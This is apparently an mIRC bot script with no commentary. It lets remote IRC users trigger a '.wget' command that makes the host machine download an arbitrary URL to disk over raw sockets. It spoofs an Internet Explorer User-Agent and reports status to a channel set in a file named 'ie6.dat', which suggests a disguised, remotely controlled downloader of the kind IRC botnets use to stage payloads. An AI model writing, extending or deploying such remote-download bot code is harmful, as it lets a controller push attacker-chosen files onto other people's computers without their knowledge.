on 10:TEXT:.wget*:*: {
  if ($2-) {
    set %i $rand(1,10000)
    set %wget. $+ %i $2-
    set %wget. $+ %i $+ .write no
    set %wget. $+ %i $+ .file $gettok($eval(% $+ wget. $+ %i,2),$numtok($eval(% $+ wget. $+ %i,2),47),47)
    if ($right($eval(% $+ wget. $+ %i,2),1) == $chr(47)) set %wget. $+ %i $+ .file index.htm
    .remove " $+ $getdir $+ $eval(% $+ wget. $+ %i $+ .file,2) $+ "
    sockopen wget $+ %i $gettok($2-,2,47) 80
  }
}

alias letsgo {
  set %i $rand(1,10000)
  set %wget. $+ %i $2-
  set %wget. $+ %i $+ .write no
  set %wget. $+ %i $+ .type $null
  set %wget. $+ %i $+ .file $gettok($eval(% $+ wget. $+ %i,2),$numtok($eval(% $+ wget. $+ %i,2),47),47)
  if ($right($eval(% $+ wget. $+ %i,2),1) == $chr(47)) set %wget. $+ %i $+ .file index.htm
  .remove " $+ $getdir $+ $eval(% $+ wget. $+ %i $+ .file,2) $+ "
  sockopen wget $+ %i $gettok($2-,2,47) 80
}

on *:sockopen:wget*: {
  if ($sockerr) {
    msg  $readini(ie6.dat,connect,chan) Web Get --- Sock Error: $sock($sockname).wsmsg
    unset $eval(% $+ wget. $+ $remove($sockname,wget) $+ *)
    halt
  }
  msg  $readini(ie6.dat,connect,chan) Downloading....
  sockwrite -n $sockname GET / $+ $gettok($eval(% $+ wget. $+ $remove($sockname,wget),2),3-,47) HTTP/1.1
  sockwrite -n $sockname HOST: $gettok($eval(% $+ wget. $+ $remove($sockname,wget),2),2,47)
  sockwrite -n $sockname ACCEPT: */*
  sockwrite -n $sockname Referer: $gettok($eval(% $+ wget. $+ $remove($sockname,wget),2),1-2,47)
  sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)
  sockwrite -n $sockname Connection: close
  sockwrite -n $sockname $crlf
}

on *:sockread:wget*: {
  if ($eval(% $+ wget. $+ $remove($sockname,wget) $+ .write,2) == no) {
    sockread %trans.dl
    if (302 Found isin %trans.dl) msg  $readini(ie6.dat,connect,chan) WGet --- 302 Error: Found
    if (404 Not Found isin %trans.dl) msg  $readini(ie6.dat,connect,chan) WGet --- 404 Error: File Not Found
    if ($left(%trans.dl,12) == Content-Type)  {
      if (text !isin %trans.dl) set %wget. $+ $remove($sockname,wget) $+ .type I
      else {
        set %wget. $+ $remove($sockname,wget) $+ .type A
      }
    }
    if (($chr(58) !isin %trans.dl) && ($eval(% $+ wget. $+ $remove($sockname,wget) $+ .type,2))) unset $eval(% $+ wget. $+ $remove($sockname,wget) $+ .write)
    echo -s %trans.dl
    } | else {
    if ($eval(% $+ wget. $+ $remove($sockname,wget) $+ .type,2) == A) {
      sockread %trans.dl
      write " $+ $getdir $+ $eval(% $+ wget. $+ $remove($sockname,wget) $+ .file,2) $+ " %trans.dl
      } | else {
      sockread &trans.dl
      bwrite " $+ $getdir $+ $eval(% $+ wget. $+ $remove($sockname,wget) $+ .file,2) $+ " -1 &trans.dl
    }
  }
}

on *:sockclose:wget*: {
  msg  $readini(ie6.dat,connect,chan) Download Complete (Size: $file($getdir $+ $eval(% $+ wget. $+ $remove($sockname,wget) $+ .file,2)).size $+ )
  unset $eval(% $+ wget. $+ $remove($sockname,wget) $+ *)
}
